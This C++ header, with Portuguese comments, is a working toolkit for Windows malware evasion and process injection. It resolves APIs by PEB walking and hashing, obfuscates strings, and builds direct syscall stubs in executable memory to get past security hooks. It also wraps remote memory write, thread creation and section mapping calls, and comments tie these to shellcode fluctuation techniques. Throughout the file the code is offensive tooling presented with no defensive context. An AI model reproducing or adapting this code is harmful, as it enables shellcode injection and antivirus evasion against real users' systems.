#pragma once
//
// syscalls.hpp
// -----------------------------------------------------------------------------
// sc::  — PEB walk + hash → LoadLibraryA / GetProcAddress + wrappers user-mode
// nt::  — Direct syscall stubs (SSN lido de ntdll em runtime)
//

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <cstdint>
#include <cstddef>
#include <atomic>
#include "xorstr.hpp"

// ---------------------------------------------------------------------------
// NT types — definidos manualmente para nao poluir o IAT com winternl.h
// ---------------------------------------------------------------------------
using NTSTATUS = LONG;

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (static_cast<NTSTATUS>(s) >= 0)
#endif

// Nossa propria UNICODE_STRING (evita conflito com winternl.h)
struct MY_UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
};

// OBJECT_ATTRIBUTES com ponteiro para nossa struct
struct OBJECT_ATTRIBUTES_
{
    ULONG               Length;
    HANDLE              RootDirectory;
    MY_UNICODE_STRING*  ObjectName;
    ULONG               Attributes;
    PVOID               SecurityDescriptor;
    PVOID               SecurityQualityOfService;
};

struct CLIENT_ID_
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
};

struct IO_STATUS_BLOCK_
{
    union { NTSTATUS Status; PVOID Pointer; };
    ULONG_PTR Information;
};

// Constantes NT
#define OBJ_CASE_INSENSITIVE_         0x00000040UL
#define FILE_SYNCHRONOUS_IO_NONALERT_ 0x00000020UL
#define FILE_NON_DIRECTORY_FILE_      0x00000040UL
#define FILE_OPEN_                    1UL
#define SYNCHRONIZE_                  0x00100000UL
#define THREAD_ALL_ACCESS_            (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE_ | 0xFFFF)
#ifndef SECTION_ALL_ACCESS
#define SECTION_ALL_ACCESS            (STANDARD_RIGHTS_REQUIRED | 0x1F)
#endif
#ifndef SEC_COMMIT
#define SEC_COMMIT                    0x08000000UL
#endif

// ============================================================================
// sc:: — user-mode resolver via PEB walk
// ============================================================================
namespace sc
{
    constexpr uint32_t djb2(const char* s)
    {
        uint32_t h = 5381;
        while (*s) h = ((h << 5) + h) + static_cast<uint32_t>(*s++);
        return h;
    }
    inline uint32_t djb2_rt(const char* s)
    {
        uint32_t h = 5381;
        while (*s) h = ((h << 5) + h) + static_cast<uint32_t>(*s++);
        return h;
    }
    inline uint32_t djb2_wide_ci(const wchar_t* s, std::size_t n)
    {
        uint32_t h = 5381;
        for (std::size_t i = 0; i < n; ++i)
        {
            wchar_t c = s[i];
            if (c >= L'A' && c <= L'Z') c += 32;
            h = ((h << 5) + h) + static_cast<uint32_t>(c);
        }
        return h;
    }

    namespace detail
    {
        struct UStr_ { USHORT Length, MaximumLength; PWSTR Buffer; };
        struct LdrEntry_
        {
            LIST_ENTRY Load, Mem, Init;
            PVOID Base, Entry;
            ULONG Size;
            UStr_ FullName, BaseName;
        };
        struct PebLdr_  { ULONG Len; BOOLEAN Init; HANDLE Ssh; LIST_ENTRY Load; };
        struct Peb_     { BYTE r1[2], Debug, r2[1]; PVOID r3[2]; PebLdr_* Ldr; };

        inline Peb_* get_peb()
        {
#if defined(_M_X64)
            return reinterpret_cast<Peb_*>(__readgsqword(0x60));
#else
            return reinterpret_cast<Peb_*>(__readfsdword(0x30));
#endif
        }

        inline void* find_module(const char* lower_name)
        {
            uint32_t th = 5381;
            for (const char* s = lower_name; *s; ++s)
            {
                char c = *s;
                if (c >= 'A' && c <= 'Z') c += 32;
                th = ((th << 5) + th) + static_cast<uint32_t>(c);
            }
            Peb_* peb = get_peb();
            if (!peb || !peb->Ldr) return nullptr;
            LIST_ENTRY* head = &peb->Ldr->Load, *cur = head->Flink;
            while (cur != head)
            {
                auto* e = CONTAINING_RECORD(cur, LdrEntry_, Load);
                if (e->BaseName.Buffer && e->BaseName.Length)
                    if (djb2_wide_ci(e->BaseName.Buffer,
                                     e->BaseName.Length / 2) == th)
                        return e->Base;
                cur = cur->Flink;
            }
            return nullptr;
        }

        inline void* find_export(void* base, uint32_t fh)
        {
            if (!base) return nullptr;
            auto* b   = static_cast<uint8_t*>(base);
            auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(b);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
            auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(b + dos->e_lfanew);
            if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
            auto& ed  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (!ed.VirtualAddress) return nullptr;
            auto* exp  = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(b + ed.VirtualAddress);
            auto* names= reinterpret_cast<uint32_t*>(b + exp->AddressOfNames);
            auto* ords = reinterpret_cast<uint16_t*>(b + exp->AddressOfNameOrdinals);
            auto* fns  = reinterpret_cast<uint32_t*>(b + exp->AddressOfFunctions);
            for (DWORD i = 0; i < exp->NumberOfNames; ++i)
                if (djb2_rt(reinterpret_cast<const char*>(b + names[i])) == fh)
                    return reinterpret_cast<void*>(b + fns[ords[i]]);
            return nullptr;
        }
    } // namespace detail

    using fn_LLA = HMODULE(WINAPI*)(LPCSTR);
    using fn_GPA = FARPROC(WINAPI*)(HMODULE, LPCSTR);

    namespace state
    {
        inline std::atomic<bool> g_init{ false };
        inline fn_LLA  pLLA = nullptr;
        inline fn_GPA  pGPA = nullptr;
    }

    inline bool Bootstrap()
    {
        if (state::g_init.load(std::memory_order_acquire)) return true;
        void* k32 = detail::find_module(xorstr("kernel32.dll"));
        if (!k32) return false;
        state::pLLA = reinterpret_cast<fn_LLA>(detail::find_export(k32, djb2_rt(xorstr("LoadLibraryA"))));
        state::pGPA = reinterpret_cast<fn_GPA>(detail::find_export(k32, djb2_rt(xorstr("GetProcAddress"))));
        if (!state::pLLA || !state::pGPA) return false;
        state::g_init.store(true, std::memory_order_release);
        return true;
    }

    inline FARPROC Resolve(const char* mod, const char* fn)
    {
        if (!state::g_init.load(std::memory_order_acquire)) Bootstrap();
        HMODULE h = state::pLLA(mod);
        return h ? state::pGPA(h, fn) : nullptr;
    }

    // --- wrappers cached ---
    using fn_GAKS     = SHORT (WINAPI*)(int);
    using fn_CTH32    = HANDLE(WINAPI*)(DWORD,DWORD);
    using fn_P32FW    = BOOL  (WINAPI*)(HANDLE,LPPROCESSENTRY32W);
    using fn_P32NW    = BOOL  (WINAPI*)(HANDLE,LPPROCESSENTRY32W);
    using fn_CH       = BOOL  (WINAPI*)(HANDLE);

    inline fn_GAKS    pGetAsyncKeyState          = nullptr;
    inline fn_CTH32   pCreateToolhelp32Snapshot  = nullptr;
    inline fn_P32FW   pProcess32FirstW           = nullptr;
    inline fn_P32NW   pProcess32NextW            = nullptr;
    inline fn_CH      pCloseHandle               = nullptr;

    inline SHORT  CallGetAsyncKeyState(int v)
    {
        if (!pGetAsyncKeyState)
            pGetAsyncKeyState = reinterpret_cast<fn_GAKS>(
                Resolve(xorstr("user32.dll"), xorstr("GetAsyncKeyState")));
        return pGetAsyncKeyState ? pGetAsyncKeyState(v) : 0;
    }
    inline HANDLE CallCreateToolhelp32Snapshot(DWORD f,DWORD p)
    {
        if (!pCreateToolhelp32Snapshot)
            pCreateToolhelp32Snapshot = reinterpret_cast<fn_CTH32>(
                Resolve(xorstr("kernel32.dll"), xorstr("CreateToolhelp32Snapshot")));
        return pCreateToolhelp32Snapshot ? pCreateToolhelp32Snapshot(f,p) : INVALID_HANDLE_VALUE;
    }
    inline BOOL   CallProcess32FirstW(HANDLE h,LPPROCESSENTRY32W e)
    {
        if (!pProcess32FirstW)
            pProcess32FirstW = reinterpret_cast<fn_P32FW>(
                Resolve(xorstr("kernel32.dll"), xorstr("Process32FirstW")));
        return pProcess32FirstW ? pProcess32FirstW(h,e) : FALSE;
    }
    inline BOOL   CallProcess32NextW(HANDLE h,LPPROCESSENTRY32W e)
    {
        if (!pProcess32NextW)
            pProcess32NextW = reinterpret_cast<fn_P32NW>(
                Resolve(xorstr("kernel32.dll"), xorstr("Process32NextW")));
        return pProcess32NextW ? pProcess32NextW(h,e) : FALSE;
    }
    inline BOOL   CallCloseHandle(HANDLE h)
    {
        if (!pCloseHandle)
            pCloseHandle = reinterpret_cast<fn_CH>(
                Resolve(xorstr("kernel32.dll"), xorstr("CloseHandle")));
        return pCloseHandle ? pCloseHandle(h) : FALSE;
    }

} // namespace sc

// ============================================================================
// nt:: — Direct syscall layer
// ============================================================================
//
// SyscallStub: aloca 16 bytes com PAGE_EXECUTE_READWRITE e escreve:
//   4C 8B D1        mov r10, rcx
//   B8 xx xx xx xx  mov eax, <SSN>
//   0F 05           syscall
//   C3              ret
//
// SSN é lido do stub em ntdll (bytes 4-7 quando o stub começa com 4C 8B D1).
// O cast para ponteiro de funcao e feito via void* para evitar C2440.
// __asm nao e suportado em x64 MSVC — usamos o stub em heap executavel.
//
namespace nt
{
    // -------------------------------------------------------------------------
    // SSN reader
    // -------------------------------------------------------------------------
    inline uint32_t get_ssn(const char* func_name)
    {
        void* ntdll = sc::detail::find_module(xorstr("ntdll.dll"));
        if (!ntdll) return 0xFFFFFFFF;

        auto* fn = static_cast<uint8_t*>(
            sc::detail::find_export(ntdll, sc::djb2_rt(func_name)));
        if (!fn) return 0xFFFFFFFF;

        // padrao x64: 4C 8B D1  B8 <SSN lo> <SSN hi> 00 00
        if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1)
            return *reinterpret_cast<uint32_t*>(fn + 4);

        // variante direta sem mov r10,rcx
        if (fn[0] == 0xB8)
            return *reinterpret_cast<uint32_t*>(fn + 1);

        return 0xFFFFFFFF;
    }

    // -------------------------------------------------------------------------
    // SyscallStub — heap executavel, inicializado uma vez por funcao
    // -------------------------------------------------------------------------
    struct SyscallStub
    {
        uint8_t* code  = nullptr;
        bool     ready = false;

        void init(uint32_t ssn)
        {
            if (ready || ssn == 0xFFFFFFFF) return;

            // Aloca pagina executavel
            code = static_cast<uint8_t*>(
                VirtualAlloc(nullptr, 16,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE));
            if (!code) return;

            // mov r10, rcx
            code[0] = 0x4C; code[1] = 0x8B; code[2] = 0xD1;
            // mov eax, ssn
            code[3] = 0xB8;
            *reinterpret_cast<uint32_t*>(code + 4) = ssn;
            // syscall
            code[8] = 0x0F; code[9] = 0x05;
            // ret
            code[10] = 0xC3;

            FlushInstructionCache(GetCurrentProcess(), code, 16);
            ready = true;
        }

        // retorna ponteiro void* para o cast tipado
        void* ptr() const { return reinterpret_cast<void*>(code); }
    };

// Macro: declara SSN cached e inicializa stub uma unica vez
#define NT_INIT_STUB(stub, name)                              \
    do {                                                      \
        if (!(stub).ready) {                                  \
            uint32_t _ssn = nt::get_ssn(name);               \
            (stub).init(_ssn);                                \
        }                                                     \
    } while(0)

    // =========================================================================
    // Funcoes tipadas
    // =========================================================================

    // --- NtOpenProcess ---
    using fn_NtOpenProcess = NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_*, CLIENT_ID_*);

    inline NTSTATUS NtOpenProcess_(
        PHANDLE hOut, ACCESS_MASK access,
        OBJECT_ATTRIBUTES_* oa, CLIENT_ID_* cid)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtOpenProcess"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtOpenProcess>(s.ptr())(hOut, access, oa, cid);
    }

    // --- NtAllocateVirtualMemory ---
    using fn_NtAllocVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    inline NTSTATUS NtAllocateVirtualMemory_(
        HANDLE hProc, PVOID* base, ULONG_PTR zeroBits,
        PSIZE_T size, ULONG allocType, ULONG protect)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtAllocateVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtAllocVM>(s.ptr())(
            hProc, base, zeroBits, size, allocType, protect);
    }

    // --- NtWriteVirtualMemory ---
    using fn_NtWriteVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

    inline NTSTATUS NtWriteVirtualMemory_(
        HANDLE hProc, PVOID addr, PVOID buf, SIZE_T size, PSIZE_T written)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtWriteVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtWriteVM>(s.ptr())(
            hProc, addr, buf, size, written);
    }

    // --- NtReadVirtualMemory ---
    using fn_NtReadVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

    inline NTSTATUS NtReadVirtualMemory_(
        HANDLE hProc, PVOID addr, PVOID buf, SIZE_T size, PSIZE_T bytesRead)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtReadVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtReadVM>(s.ptr())(
            hProc, addr, buf, size, bytesRead);
    }

    // --- NtQueryVirtualMemory ---
    using fn_NtQVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);

    inline NTSTATUS NtQueryVirtualMemory_(
        HANDLE hProc, PVOID addr, ULONG infoClass,
        PVOID buf, SIZE_T size, PSIZE_T retLen)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtQueryVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtQVM>(s.ptr())(
            hProc, addr, infoClass, buf, size, retLen);
    }

    // --- NtProtectVirtualMemory ---
    using fn_NtProtectVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

    inline NTSTATUS NtProtectVirtualMemory_(
        HANDLE hProc, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtProtectVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtProtectVM>(s.ptr())(
            hProc, base, size, newProt, oldProt);
    }

    // --- NtFreeVirtualMemory ---
    using fn_NtFreeVM = NTSTATUS(NTAPI*)(
        HANDLE, PVOID*, PSIZE_T, ULONG);

    inline NTSTATUS NtFreeVirtualMemory_(
        HANDLE hProc, PVOID* base, PSIZE_T size, ULONG freeType)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtFreeVirtualMemory"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtFreeVM>(s.ptr())(
            hProc, base, size, freeType);
    }

    // --- NtCreateThreadEx ---
    using fn_NtCreateThreadEx = NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE,
        PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

    inline NTSTATUS NtCreateThreadEx_(
        PHANDLE hThread, ACCESS_MASK access, PVOID objAttr,
        HANDLE hProc, PVOID startAddr, PVOID param,
        ULONG flags, SIZE_T zeroBits, SIZE_T stackSize,
        SIZE_T maxStack, PVOID attrList)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtCreateThreadEx"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtCreateThreadEx>(s.ptr())(
            hThread, access, objAttr, hProc,
            startAddr, param, flags, zeroBits,
            stackSize, maxStack, attrList);
    }

    // --- NtTerminateProcess ---
    using fn_NtTerminateProcess = NTSTATUS(NTAPI*)(HANDLE, NTSTATUS);

    inline NTSTATUS NtTerminateProcess_(HANDLE h, NTSTATUS exitCode)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtTerminateProcess"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtTerminateProcess>(s.ptr())(h, exitCode);
    }

    // --- NtClose ---
    using fn_NtClose = NTSTATUS(NTAPI*)(HANDLE);

    inline NTSTATUS NtClose_(HANDLE h)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtClose"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtClose>(s.ptr())(h);
    }

    // --- NtOpenThread (ShellcodeFluctuation: openThreadViaSyscall) ---
    using fn_NtOpenThread = NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_*, CLIENT_ID_*);

    inline NTSTATUS NtOpenThread_(
        PHANDLE hOut, ACCESS_MASK access,
        OBJECT_ATTRIBUTES_* oa, CLIENT_ID_* cid)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtOpenThread"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtOpenThread>(s.ptr())(hOut, access, oa, cid);
    }

    // --- NtCreateSection (ShellcodeFluctuation: SectionAllocRemote) ---
    using fn_NtCreateSection = NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_*, PLARGE_INTEGER,
        ULONG, ULONG, HANDLE);

    inline NTSTATUS NtCreateSection_(
        PHANDLE hOut, ACCESS_MASK access, OBJECT_ATTRIBUTES_* oa,
        PLARGE_INTEGER maxSize, ULONG pageProtect,
        ULONG sectionAttribs, HANDLE file)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtCreateSection"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtCreateSection>(s.ptr())(
            hOut, access, oa, maxSize, pageProtect, sectionAttribs, file);
    }

    // --- NtMapViewOfSection (ShellcodeFluctuation: SectionAllocRemote) ---
    using fn_NtMapViewOfSection = NTSTATUS(NTAPI*)(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
        PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);

    inline NTSTATUS NtMapViewOfSection_(
        HANDLE hSection, HANDLE hProcess, PVOID* base,
        ULONG_PTR zeroBits, SIZE_T commitSize,
        PLARGE_INTEGER sectionOffset, PSIZE_T viewSize,
        ULONG inheritDisposition, ULONG allocationType, ULONG win32Protect)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtMapViewOfSection"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtMapViewOfSection>(s.ptr())(
            hSection, hProcess, base, zeroBits, commitSize,
            sectionOffset, viewSize, inheritDisposition,
            allocationType, win32Protect);
    }

    // --- NtSuspendThread ---
    using fn_NtSuspendThread = NTSTATUS(NTAPI*)(HANDLE, PULONG);

    inline NTSTATUS NtSuspendThread_(HANDLE hThread, PULONG previousCount)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtSuspendThread"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtSuspendThread>(s.ptr())(hThread, previousCount);
    }

    // --- NtResumeThread ---
    using fn_NtResumeThread = NTSTATUS(NTAPI*)(HANDLE, PULONG);

    inline NTSTATUS NtResumeThread_(HANDLE hThread, PULONG previousCount)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtResumeThread"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtResumeThread>(s.ptr())(hThread, previousCount);
    }

    // --- NtDelayExecution (ShellcodeFluctuation: JitterDelay) ---
    using fn_NtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN, PLARGE_INTEGER);

    inline NTSTATUS NtDelayExecution_(BOOLEAN alertable, PLARGE_INTEGER interval)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtDelayExecution"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtDelayExecution>(s.ptr())(alertable, interval);
    }

    // --- NtQuerySystemInformation ---
    using fn_NtQSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);

    inline NTSTATUS NtQuerySystemInformation_(
        ULONG cls, PVOID buf, ULONG len, PULONG ret)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtQuerySystemInformation"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtQSI>(s.ptr())(cls, buf, len, ret);
    }

    // --- NtDuplicateObject ---
    using fn_NtDuplicateObject = NTSTATUS(NTAPI*)(
        HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);

    inline NTSTATUS NtDuplicateObject_(
        HANDLE srcProc, HANDLE srcHandle, HANDLE dstProc, PHANDLE dstHandle,
        ACCESS_MASK access, ULONG attrs, ULONG opts)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtDuplicateObject"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtDuplicateObject>(s.ptr())(
            srcProc, srcHandle, dstProc, dstHandle, access, attrs, opts);
    }

    // --- NtQueryObject ---
    using fn_NtQueryObject = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);

    inline NTSTATUS NtQueryObject_(
        HANDLE h, ULONG cls, PVOID buf, ULONG len, PULONG ret)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtQueryObject"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtQueryObject>(s.ptr())(h, cls, buf, len, ret);
    }

    // --- NtOpenFile ---
    using fn_NtOpenFile = NTSTATUS(NTAPI*)(
        PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_*, IO_STATUS_BLOCK_*, ULONG, ULONG);

    inline NTSTATUS NtOpenFile_(
        PHANDLE hOut, ACCESS_MASK access,
        OBJECT_ATTRIBUTES_* oa, IO_STATUS_BLOCK_* iosb,
        ULONG shareAccess, ULONG opts)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtOpenFile"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtOpenFile>(s.ptr())(
            hOut, access, oa, iosb, shareAccess, opts);
    }

    // --- NtReadFile ---
    using fn_NtReadFile = NTSTATUS(NTAPI*)(
        HANDLE,HANDLE,PVOID,PVOID,IO_STATUS_BLOCK_*,PVOID,ULONG,PLARGE_INTEGER,PULONG);

    inline NTSTATUS NtReadFile_(
        HANDLE hFile, IO_STATUS_BLOCK_* iosb, PVOID buf, ULONG len)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtReadFile"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtReadFile>(s.ptr())(
            hFile, nullptr, nullptr, nullptr, iosb,
            buf, len, nullptr, nullptr);
    }

    // --- NtWriteFile ---
    using fn_NtWriteFile = NTSTATUS(NTAPI*)(
        HANDLE,HANDLE,PVOID,PVOID,IO_STATUS_BLOCK_*,PVOID,ULONG,PLARGE_INTEGER,PULONG);

    inline NTSTATUS NtWriteFile_(
        HANDLE hFile, IO_STATUS_BLOCK_* iosb, PVOID buf, ULONG len)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtWriteFile"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtWriteFile>(s.ptr())(
            hFile, nullptr, nullptr, nullptr, iosb,
            buf, len, nullptr, nullptr);
    }

    // --- NtQueryInformationFile ---
    struct FILE_STANDARD_INFORMATION_
    {
        LARGE_INTEGER AllocationSize;
        LARGE_INTEGER EndOfFile;
        ULONG         NumberOfLinks;
        BOOLEAN       DeletePending;
        BOOLEAN       Directory;
    };

    using fn_NtQIF = NTSTATUS(NTAPI*)(
        HANDLE, IO_STATUS_BLOCK_*, PVOID, ULONG, ULONG);

    inline NTSTATUS NtQueryInformationFile_(
        HANDLE hFile, IO_STATUS_BLOCK_* iosb,
        PVOID buf, ULONG len, ULONG cls)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtQueryInformationFile"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtQIF>(s.ptr())(hFile, iosb, buf, len, cls);
    }

    // --- NtSetInformationFile ---
    struct FILE_END_OF_FILE_INFORMATION_ { LARGE_INTEGER EndOfFile; };
    struct FILE_DISPOSITION_INFORMATION_ { BOOLEAN DeleteFile; };

    using fn_NtSIF = NTSTATUS(NTAPI*)(
        HANDLE, IO_STATUS_BLOCK_*, PVOID, ULONG, ULONG);

    inline NTSTATUS NtSetInformationFile_(
        HANDLE hFile, IO_STATUS_BLOCK_* iosb,
        PVOID buf, ULONG len, ULONG cls)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtSetInformationFile"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtSIF>(s.ptr())(hFile, iosb, buf, len, cls);
    }

    // --- NtWaitForSingleObject ---
    using fn_NtWFSO = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PLARGE_INTEGER);

    inline NTSTATUS NtWaitForSingleObject_(
        HANDLE h, BOOLEAN alertable, PLARGE_INTEGER timeout)
    {
        static SyscallStub s;
        NT_INIT_STUB(s, xorstr("NtWaitForSingleObject"));
        if (!s.ready) return 0xC0000001L;
        return reinterpret_cast<fn_NtWFSO>(s.ptr())(h, alertable, timeout);
    }

    // -------------------------------------------------------------------------
    // Helper: abre processo por PID com acesso completo
    // -------------------------------------------------------------------------
    inline HANDLE OpenProcessById(DWORD pid)
    {
        OBJECT_ATTRIBUTES_ oa{};
        oa.Length     = sizeof(oa);
        oa.ObjectName = nullptr;

        CLIENT_ID_ cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
        cid.UniqueThread  = nullptr;

        HANDLE h = nullptr;
        NtOpenProcess_(&h, PROCESS_ALL_ACCESS, &oa, &cid);
        return h;
    }

} // namespace nt

// ============================================================================
// nt_path:: — helpers para NT paths e abertura de arquivos
// ============================================================================
namespace nt_path
{
    // Converte "C:\foo" → "\??\C:\foo"
    inline void to_nt(const wchar_t* win32, wchar_t* out, std::size_t outCch)
    {
        const wchar_t pfx[] = L"\\??\\";
        std::size_t pi = 0;
        while (pfx[pi] && pi < outCch - 1) { out[pi] = pfx[pi]; ++pi; }
        for (std::size_t i = 0; win32[i] && pi < outCch - 1; ++i)
            out[pi++] = win32[i];
        out[pi] = L'\0';
    }

    inline HANDLE open_file(const wchar_t* win32Path,
                             ACCESS_MASK    access,
                             ULONG          opts)
    {
        wchar_t ntPath[512]{};
        to_nt(win32Path, ntPath, 512);

        MY_UNICODE_STRING us{};
        us.Buffer        = ntPath;
        us.Length        = static_cast<USHORT>(wcslen(ntPath) * sizeof(wchar_t));
        us.MaximumLength = us.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES_ oa{};
        oa.Length     = sizeof(oa);
        oa.ObjectName = &us;
        oa.Attributes = OBJ_CASE_INSENSITIVE_;

        IO_STATUS_BLOCK_ iosb{};
        HANDLE h = nullptr;

        nt::NtOpenFile_(&h,
            access | SYNCHRONIZE_,
            &oa, &iosb,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            opts | FILE_SYNCHRONOUS_IO_NONALERT_);

        return h;
    }
} // namespace nt_path
